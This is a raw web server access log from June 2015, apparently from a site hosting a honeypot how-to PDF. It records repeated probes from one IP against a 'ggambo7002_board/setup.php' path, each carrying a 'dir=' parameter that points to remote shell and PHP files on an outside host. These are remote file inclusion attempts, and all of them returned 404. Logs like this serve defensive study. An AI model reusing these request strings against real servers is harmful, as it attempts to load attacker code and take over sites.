112.218.68.155 - - [28/Jun/2015:18:44:45 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:50:52 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:50:54 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:50:54 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:50:56 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:50:56 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:50:58 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:50:59 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:51:00 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:51:01 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:51:02 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:51:03 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:51:04 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
199.59.148.210 - - [28/Jun/2015:19:05:30 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.210 - - [28/Jun/2015:19:05:30 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279362 "-" "Twitterbot/1.0" 
112.218.68.155 - - [28/Jun/2015:19:07:24 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:19:07:26 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36" 
